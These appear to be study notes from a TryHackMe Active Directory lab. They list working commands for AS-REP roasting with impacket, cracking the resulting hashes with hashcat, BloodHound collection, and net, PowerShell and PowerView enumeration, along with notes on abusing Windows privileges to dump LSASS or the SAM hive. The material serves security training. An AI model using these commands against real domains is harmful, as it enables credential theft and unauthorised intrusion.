# AD: Authenticated Enumeration

## As-Rep roasting

A flag UF_DONT_REQUIRE_PREAUTH must be set

Installing impacket

<pre> git clone https://github.com/fortra/impacket.git

cd impacket

python3 -m venv impacket-env

source impacket-env/bin/activate

pip install impacket
</pre>

Than run commands like this
<pre> impacket-smbclient -h </pre>

Run the program
<pre> impacket-GetNPUsers tryhackme.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass </pre>

Crack the hashes 
<pre>
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt

hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt --show
</pre>

## Manual enumeration

<pre> whoami /all</pre>


    SeImpersonatePrivilege: As mentioned already, this privilege allows a process to impersonate the security context of another user after authentication. The “potato” attack revolves around abusing this privilege.

    SeAssignPrimaryTokenPrivilege: This privilege permits a process to assign the primary token of another user to a new process. It is used in conjunction with the SeImpersonatePrivilege privilege.

    SeBackupPrivilege: This privilege lets users read any file on the system, ignoring file permissions. Consequently, attackers can use it to dump sensitive files like the SAM or SYSTEM hive.

    SeRestorePrivilege: This privilege grants the ability to write to any file or registry key without adhering to the set file permissions. Hence, it can be abused to overwrite critical system files or registry settings.

    SeDebugPrivilege: This privilege allows the account to attach a debugger to any process. As a result, the attacker can use this privilege to dump memory from LSASS and extract credentials or even inject malicious code into privileged processes.

`systeminfo | findstr /B "OS"` to learn the OS name and version

### Enumerating Users and Groups with NET

<pre> net user /domain 

net user "username" /domain

net group /domain # Generally, any group with “Admin” in its name is worth checking

net localgroup

schtasks /query
</pre>

## Enumeration With BloodHound

Sharphound
<pre> .\SharpHound.exe --CollectionMethods All --Domain tryhackme.loc --ExcludeDCs </pre>

attacker's pc
<pre> bloodhound-python -u asrepuser1 -p qwerty123! -d tryhackme.loc -ns 10.211.12.10 -c All --zip
 </pre>


## Enumeration With PowerShell’s ActiveDirectory and PowerView Modules

### User Enumeration
<pre>
Get-Module -ListAvailable ActiveDirectory

Import-Module ActiveDirectory

Get-ADUser -Filter *

Get-ADUser -Identity username

Get-ADUser -Identity Administrator -Properties LastLogonDate,MemberOf,Title,Description,PwdLastSet
</pre>

### Group Enumeration

<pre>
Get-ADGroup -Filter *

Get-ADGroupMember -Identity "Group Name"


</pre>

### User Enumeration with powerSploit

<pre>
Import-Module .\PowerView.ps1 
Get-DomainUser 

Get-DomainUser *admin*
</pre>